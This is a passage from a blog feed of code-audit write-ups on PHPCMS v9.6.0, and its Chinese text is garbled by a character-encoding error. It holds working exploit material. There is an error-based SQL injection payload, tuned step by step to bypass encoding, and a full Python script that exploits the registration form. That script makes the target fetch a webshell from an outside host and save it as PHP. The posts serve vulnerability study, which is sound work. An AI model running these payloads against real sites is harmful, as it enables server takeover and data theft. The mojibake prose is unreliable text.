class="code"><pre><span class="line">http://www.phpcms96.com/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%2526id=%25*27%2520and%2520updatexml%25281%252Cconcat%25281%252C%2528user%2528%2529%2529%2529%252C1%2529%2523%2526m%253D1%2526modelid%253D1%2526catid%253D1%2526f%253DTao</span><br></pre></td></tr></table></figure><p>åˆ†æå¦‚ä¸‹å›¾</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328145323190.png" alt="image-20210328145323190"></p><p>å°±æ˜¯å¯¹æˆ‘ä»¬çš„urlè¿›è¡Œäº†ç¼–ç ï¼Œåˆ°è¿™é‡Œæˆ‘ä»¬ä»…ä»…åªæ˜¯å‘ç°äº†<code>requests</code>åº“å¯¹æˆ‘ä»¬çš„urlè¿›è¡Œäº†<code>encode</code>ï¼Œä½†phpé‚£è¾¹ä¸ºä»€ä¹ˆä¼šæŠ¥é”™æˆ‘ä»¬è¿˜æ²¡æœ‰ææ˜ç™½ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¾—åœ¨phpé‚£è¾¹è¿›è¡Œè°ƒè¯•è§‚å¯Ÿã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328145945198.png" alt="image-20210328145945198"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">26</span>id=%<span class="number">27</span>andupdatexml%<span class="number">281</span>%<span class="number">2</span>Cconcat%<span class="number">281</span>%<span class="number">2</span>C%<span class="number">28</span>user%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2</span>C1%<span class="number">29</span>%<span class="number">23</span>%<span class="number">26</span>m%<span class="number">3</span>D1%<span class="number">26</span>modelid%<span class="number">3</span>D1%<span class="number">26</span>catid%<span class="number">3</span>D1%<span class="number">26</span>f%<span class="number">3</span>DTao</span><br></pre></td></tr></table></figure><p>æ¥ç€èµ°åˆ°Step3çš„ä»£ç ä½ç½®ï¼Œå¯ä»¥å‘ç°<code>parse_str</code>æ‰§è¡Œå®Œäº†ï¼Œå¹¶æ²¡æœ‰å¾—åˆ°<code>$id</code>å˜é‡ã€‚å‰é¢è¯´åˆ°<code>parse_str</code>å‡½æ•°æ˜¯æ ¹æ®<code>&amp;</code>ç¬¦è¿›è¡Œè§£ææ³¨å†Œçš„ã€‚ä½†æ˜¯ç”±äºè¿™é‡Œurlencodeå°†æˆ‘ä»¬çš„<code>&amp;</code>è¿›è¡Œç¼–ç äº†ï¼Œæ²¡æœ‰è§£ææ³¨å†Œå¯¹åº”çš„å˜é‡ã€‚æ‰€ä»¥æŠ¥äº†ä¸Šé¢çš„å‚æ•°é”™è¯¯ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328150413726.png" alt="image-20210328150413726"></p><p>ä¸Šé¢çš„åˆ†æå¾ˆæ¸…æ¥šçš„è¯´æ˜äº†é—®é¢˜ï¼Œå°±æ˜¯å¯¹urlå¤šè¿›è¡Œäº†ä¸€æ¬¡<code>encode</code>ã€‚é‚£ä¹ˆæ€ä¹ˆè§£å†³å‘¢ï¼Ÿè¿™æ—¶å€™æˆ‘çŒœçœ‹åˆ°è¿™é‡Œçš„äººä½ ä»¬è‚¯å®šæƒ³çš„æ˜¯å°†<font color="red">Step2</font>çš„URLè¿›è¡Œ<code>urlencode</code>è§£ç ï¼Œç„¶åå†è¿½åŠ ä¸Šå»ï¼ˆæ˜¯ä¸æ˜¯ï¼Ÿï¼‰ï¼Œé‚£ä¹ˆä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&quot;</span></span><br><span class="line">url_two = url + <span class="string">&quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=&#123;&#125;&quot;</span>.format(payload) </span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå¦‚ä¸‹å›¾ï¼ŒæŠ¥<code>Controller does not exist.</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328160718718.png" alt="image-20210328160718718"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.phpcms96.com/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%2526id=%25*27%20and%20updatexml(1,concat(1,(user())),1)%2523&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao</span><br></pre></td></tr></table></figure><p>ç”±äºæ˜¯MVCæ¶æ„ï¼Œæˆ‘ä»¬åé¢çš„<code>m=1</code>è·Ÿå‰é¢çš„<code>m=attachments</code>å†²çªäº†ã€‚æˆ‘ä»¬å°†åé¢çš„<code>m=1</code>åˆ é™¤è¯•ä¸€è¯•ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328161836408.png" alt="image-20210328161836408"></p><p>è¿˜æœ‰æœ‰é—®é¢˜å•Šï¼Œæ²¡æœ‰<code>&amp;</code>ç¬¦ã€‚çœ‹åˆ°è¿™é‡Œï¼Œä½ è‚¯å®šåˆä¼šè§‰å¾—ï¼Œç›´æ¥æŠŠidå‰é¢çš„<code>%26</code>æ”¹æˆ<code>&amp;</code>ä¸å°±å¥½äº†å˜›ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&quot;</span></span><br><span class="line">url_two = url + <span class="string">&quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=&#123;&#125;&quot;</span>.format(payload) </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328162339048.png" alt="image-20210328162339048"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328162419778.png" alt="image-20210328162419778"></p><p><code>src=&#39;&#39;</code>é‚£è¿™ä¸ªæ¼æ´å°±æ²¡æ³•åˆ©ç”¨ï¼Œæ‰€ä»¥è¯´è¿™ä¸ªåˆ©ç”¨æ€è·¯çœŸçš„å¾ˆå¦™ã€‚</p><p>å°±æ˜¯åˆ é™¤äº†<code>m=1</code>,å°±æ²¡åŠæ³•è¿‡ä¸‹é¢çš„ä»£ç äº†ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328173701045.png" alt="image-20210328173701045"></p><p>å¥½äº†å¥½äº†ä¸ç»•äº†ï¼Œè¿˜æ˜¯æ•´ç†ä¸€ä¸‹æ¥è¯´å§ï¼ˆå‰é¢è¿˜æœ‰ä¸€äº›ç»†èŠ‚ç‚¹æ²¡è¯´åˆ°ï¼‰ã€‚å‰é¢è¯´äº†ä¸€å †ï¼Œå¤§æ¦‚æƒ…å†µæ€»ç»“ä¸‹æ¥å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328175409487.png" alt="image-20210328175409487"></p><p>åˆ™è¿™ä¸€åˆ‡ä¸€åˆ‡åŸå› å°±æ˜¯<code>id=%*27</code>è¿™æ®µéƒ¨åˆ†ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿè´´ä¸‹å¤„ç†URLçš„ä»£ç å§(é‡ç‚¹å…³æ³¨æ³¨é‡Š<code>!!!</code>çš„ä»£ç )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// requestsæºä»£ç  urllib3/util/url.pyæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">PERCENT_RE = re.compile(<span class="string">r&quot;%[a-fA-F0-9]&#123;2&#125;&quot;</span>)<span class="comment"># !!!</span></span><br><span class="line">.....</span><br><span class="line">    component, percent_encodings = PERCENT_RE.subn(</span><br><span class="line">        <span class="keyword">lambda</span> match: match.group(<span class="number">0</span>).upper(), component</span><br><span class="line">    )<span class="comment"># !!!</span></span><br><span class="line"></span><br><span class="line">    uri_bytes = component.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;surrogatepass&quot;</span>)</span><br><span class="line">    is_percent_encoded = percent_encodings == uri_bytes.count(<span class="string">b&quot;%&quot;</span>)<span class="comment"># !!!</span></span><br><span class="line">    encoded_component = bytearray()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(uri_bytes)):</span><br><span class="line">        <span class="comment"># Will return a single character bytestring on both Python 2 &amp; 3</span></span><br><span class="line">        byte = uri_bytes[i : i + <span class="number">1</span>]</span><br><span class="line">        byte_ord = ord(byte)</span><br><span class="line">        <span class="keyword">if</span> (is_percent_encoded <span class="keyword">and</span> byte == <span class="string">b&quot;%&quot;</span>) <span class="keyword">or</span> (<span class="comment"># !!!</span></span><br><span class="line">            byte_ord &lt; <span class="number">128</span> <span class="keyword">and</span> byte.decode() <span class="keyword">in</span> allowed_chars</span><br><span class="line">        ):</span><br><span class="line">            encoded_component += byte</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        encoded_component.extend(<span class="string">b&quot;%&quot;</span> + (hex(byte_ord)[<span class="number">2</span>:].encode().zfill(<span class="number">2</span>).upper()))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encoded_component.decode(encoding)</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œï¼Œä½ åº”è¯¥çŸ¥é“æ€ä¹ˆå›äº‹äº†å§ï¼Œå¦‚æœä½ è¿˜ä¸çŸ¥é“ï¼Œä¹Ÿæ²¡å…³ç³»ã€‚æˆ‘ä»¬é€šè¿‡å¯¹æ¯”è§‚å¯Ÿç°è±¡æ¥è¯´æ˜é—®é¢˜ï¼š</p><ul><li>è°ƒè¯•å°†<code>%</code>encodeçš„ä»£ç </li></ul><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328180909249.png" alt="image-20210328180909249"></p><ul><li>è°ƒè¯•ä¸ä¼šå°†<code>%</code>encodeçš„ä»£ç </li></ul><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328181606146.png" alt="image-20210328181606146"></p><p>å…·ä½“æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆè¯´ï¼Œå¤§æ¦‚å°±æ˜¯æˆ‘ä»¬urlç¼–ç çš„æ•°æ®ï¼ˆæ¯”å¦‚<code>%27</code>ç­‰å¤šä¸ªï¼Œå®Œæ•´çš„ï¼‰é€šè¿‡æ­£åˆ™åŒ¹é…çš„ï¼Œéœ€è¦è·Ÿ<code>uri_bytes.count(b&quot;%&quot;)</code>è·å–çš„ç›¸ç­‰ï¼Œè€Œè¿™é‡Œç”±äºå•ç‹¬çš„<code>%</code>ï¼ˆä¸ç›¸ç­‰ï¼‰ï¼Œå› æ­¤å°±ä¼šè¢«<code>encode</code>ã€‚</p><p>ç”±äº<font color="red">Step2</font>çš„pocæ˜¯éœ€è¦ç»è¿‡<code>safe_replace</code>å¤„ç†ï¼Œç„¶åæ‹¼æ¥æ„é€ çš„SQLè¯­å¥ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦å°†<code>%</code>è¿›è¡Œurlç¼–ç å³å¯ï¼Œäºæ˜¯æˆ‘ä»¬è„šæœ¬çš„pocå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%25*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&quot;</span></span><br></pre></td></tr></table></figure><p>åˆ°äº†è¿™ä¸€æ­¥ï¼Œè¿˜æ²¡æœ‰å®Œï¼Œå› ä¸ºä¾æ—§æ²¡æ³•æˆåŠŸåˆ©ç”¨ï¼Œçœ‹ä¸‹å›¾ï¼Œè¿˜æ˜¯å‚æ•°é”™è¯¯ã€‚ï¼ˆåŸå› å°±æ˜¯å‰é¢æåˆ°çš„MVCæ¶æ„ï¼Œè¿™é‡Œmå†²çªçš„é—®é¢˜ï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328182146207.png" alt="image-20210328182146207"></p><p>è°ƒè¯•çš„æ—¶å€™ç›´æ¥åˆ°äº†Step3å“ªé‡Œã€‚<code>$a_k</code>è¿˜æ˜¯ç©ºï¼ˆè¯´æ˜æœªç»è¿‡<code>swfupload_json()</code>ï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328194150558.png" alt="image-20210328194150558"></p><p>æ­£å¸¸æ¥è¯´æ‰§è¡Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328182535779.png" alt="image-20210328182535779"></p><p>æ¶æ„ä»£ç æ˜¯é€šè¿‡srcå‚æ•°ä¼ å…¥çš„ï¼Œè€Œç¬¬3å¤„å¯¹å…¶ä»–å˜é‡è¿›è¡Œäº†åˆ¤æ–­ã€‚æ ¹æ®å‰é¢åˆ†æçš„æˆªå›¾ï¼Œå·²çŸ¥è®¿é—®Step2é“¾æ¥çš„æ—¶å€™ä¼šè¿›è¡Œ<code>decode</code>,æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†<code>&amp;</code>è¿›è¡Œurlç¼–ç ï¼Œæœ€ç»ˆçš„è„šæœ¬pocå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%25*27 and updatexml(1,concat(1,(user())),1)%23%26modelid=1%26catid=1%26m=1%26f=Tao&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328182942143.png" alt="image-20210328182942143"></p><p>æ²¡é—®é¢˜äº†ï¼ï¼ï¼</p><p>è„šæœ¬æŠ¥é”™çš„ä¸»è¦åŸå› æ˜¯<code>id=%*27</code>ä¸­è¿™ä¸ª<code>%</code>æå¾—é¬¼ï¼ˆä½†æ˜¯è¿™ä¹ˆå†™ä¹Ÿæ˜¯ä¸€å®šçš„ï¼Œç»•è¿‡<code>safe_replace</code>å‡½æ•°ç„¶åæ‹¼æ¥SQLè¯­å¥ï¼‰ã€‚è¿˜æœ‰<code>&amp;</code>ã€‚ç”±æ­¤å¯çŸ¥ï¼Œæˆ‘ä»¬åªéœ€è¦å°†åé¢<code>id</code>åé¢çš„æ•°æ®ç¼–ç å°±å¯ä»¥æˆåŠŸåˆ©ç”¨ã€‚å½“ç„¶å•¦ï¼Œæœ€æ¨èå¾—å†™æ³•æ˜¯åˆ©ç”¨<code>quote</code>å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯è¿›è¡Œç‰¹æ®Šç¬¦å·çš„encodeã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328183316790.png" alt="image-20210328183316790"></p><p>çœ‹åˆ°è¿™é‡Œï¼Œè‚¯å®šåˆä¼šæœ‰äººè¦é—®äº†ï¼Œä½ ä¸Šé¢è°ƒç”¨çš„æ˜¯<code>requests.utils.quote()</code>ï¼Œæ€ä¹ˆæ”¾çš„å›¾æ˜¯<code>urllib.parse.unquote()</code>ã€‚</p><blockquote><p><code>urllib.parse.unquote</code>å®˜æ–¹æ–‡æ¡£æœ‰è¯´æ˜ï¼Œ<code>requests</code>æ˜¯ç¬¬ä¸‰æ–¹åº“ï¼Œå®ƒå®˜ç½‘æ–‡æ¡£æˆ‘æ²¡çœ‹åˆ°å¯¹æ­¤å‡½æ•°çš„è¯´æ˜ã€‚ä½†æ˜¯éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p></blockquote><p>ä½¿ç”¨è¿™ä¸ªå‡½æ•°åï¼Œè®¿é—®çš„URLå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;http://www.phpcms96.com/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%25%2A27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%2523%26modelid%3D1%26catid%3D1%26m%3D1%26f%3DTao&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328153708049.png" alt="image-20210328153708049"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328183720027.png" alt="image-20210328183720027"></p><p> æ–‡ç« ä¸­æœ‰ä»€ä¹ˆä¸è¶³å’Œé”™è¯¯çš„åœ°æ–¹è¿˜æœ›å¸ˆå‚…ä»¬æŒ‡æ­£ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;p&gt;å‚è€ƒ&lt;a href=&quot;https://taonn.github.io/2021/02/06/%E4%BB%A3%E7%A0%</summary>
      
    
    
    
    <category term="webå®‰å…¨" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHPä»£ç å®¡è®¡" scheme="https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡ä¹‹PHPCMS_V9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ</title>
    <link href="https://taonn.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://taonn.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-02-07T01:39:31.000Z</published>
    <updated>2021-04-08T13:16:33.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHPCMS-V9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ"><a href="#PHPCMS-V9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ" class="headerlink" title="PHPCMS_V9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ"></a>PHPCMS_V9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>PHPCMSæ˜¯ä¸€æ¬¾ç½‘ç«™ç®¡ç†è½¯ä»¶ã€‚è¯¥è½¯ä»¶é‡‡ç”¨æ¨¡å—åŒ–å¼€å‘,æ”¯æŒå¤šç§åˆ†ç±»æ–¹å¼ã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æœ¬æ¬¡PHPCMSç‰ˆæœ¬ä¸º<code>9.6.0</code>,å®‰è£…æ­¥éª¤è·Ÿä¸Šä¸€ç¯‡æ–‡ç« ä¸€æ ·ï¼Œå‚è€ƒ<a href="https://taonn.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS_V9.2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ</a></p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>åœ¨æ³¨å†Œç”¨æˆ·å¤„ï¼Œæ·»åŠ ç”¨æˆ·è¿›è¡ŒæŠ“åŒ…ï¼ˆè¿™é‡Œä»¥Taoä¸ºä¾‹ï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313203000959.png" alt="image-20210313203000959"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#poc</span></span><br><span class="line">siteid=<span class="number">1</span>&amp;modelid=<span class="number">11</span>&amp;username=Tao&amp;password=<span class="number">123456</span>&amp;email=Tao@qq.com&amp;info[<span class="type">content</span>]=&lt;img src=http://www.tao.com/t.txt?.php<span class="comment">#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span></span><br><span class="line"><span class="comment"># http://www.tao.com/t.txtæ˜¾ç¤ºçš„å†…å®¹ä¸ºä½ è¦ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹</span></span><br></pre></td></tr></table></figure><p>æœ¬æ¬¡æµ‹è¯•ä¸­, <code>http://www.tao.com/t.txt</code>æ–‡æœ¬å†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313203253414.png" alt="image-20210313203253414"></p><p>ä¿®æ”¹ï¼Œæ”¾åŒ…å›æ˜¾å¦‚ä¸‹ï¼Œç„¶åæˆ‘ä»¬è®¿é—®è¯¥è¿”å›çš„url</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313203647323.png" alt="image-20210313203647323"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313203805927.png" alt="image-20210313203805927"></p><p>åˆ©ç”¨æˆåŠŸï¼ï¼ï¼è¿™é‡Œå†è´´ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">version: python3</span></span><br><span class="line"><span class="string">Author: Tao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">anyfile_up</span>(<span class="params">surl,url</span>):</span></span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&quot;</span>.format(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;siteid&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;modelid&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;Tao&#123;&#125;&#x27;</span>.format(random.randint(<span class="number">1</span>,<span class="number">9999</span>)),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;Tao&#123;&#125;@xxx.com&#x27;</span>.format(random.randint(<span class="number">1</span>,<span class="number">9999</span>)),</span><br><span class="line">        <span class="string">&#x27;info[content]&#x27;</span>: <span class="string">&#x27;&lt;img src=&#123;&#125;?.php#.jpg&gt;&#x27;</span>.format(surl),</span><br><span class="line">        <span class="string">&#x27;dosubmit&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;protocol&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    return_url = re.findall(<span class="string">r&#x27;img src=(.*)&amp;gt&#x27;</span>,r.text)</span><br><span class="line">    <span class="keyword">if</span> len(return_url):</span><br><span class="line">        <span class="keyword">return</span> return_url[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        return_url = anyfile_up(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        print(<span class="string">&#x27;seccess! upload file url: &#x27;</span>, return_url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        message = \</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        python3 anyfile_up.py [ä¸Šä¼ å†…å®¹URLåœ°å€] [ç›®æ ‡URL]</span></span><br><span class="line"><span class="string">        example: python3 anyfile_up.py http://www.tao.com/shell.txt http://www.phpcms96.com</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        print(message)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313210542652.png" alt="image-20210313210542652"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™ä¸ªæ¼æ´å­˜åœ¨äºç”¨æˆ·æ³¨å†Œå¤„ï¼Œé€šè¿‡ä¸Šé¢è¯·æ±‚çš„åœ°å€ï¼ˆ<code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</code>ï¼‰,å®šä½å¤„ç†è¯·æ±‚çš„å‡½æ•°ä¸º<code>register</code>,ä½äºæ–‡ä»¶<code>phpcms/modules/member/index.php</code>33è¡Œå¤„ã€‚</p><p>ä¸ºäº†æ›´å¥½çš„ç†è§£æ¼æ´çš„åŸç†å’Œåˆ©ç”¨çš„å·§å¦™ä¹‹å¤„ï¼Œæˆ‘ä»¬å°±å…ˆçœ‹çœ‹æ­£å¸¸çš„æ³¨å†Œæµç¨‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 61-79</span></span><br><span class="line">$userinfo = <span class="keyword">array</span>();</span><br><span class="line">$userinfo[<span class="string">&#x27;encrypt&#x27;</span>] = create_randomstr(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">$userinfo[<span class="string">&#x27;username&#x27;</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; is_username($_POST[<span class="string">&#x27;username&#x27;</span>])) ? $_POST[<span class="string">&#x27;username&#x27;</span>] : <span class="keyword">exit</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">$userinfo[<span 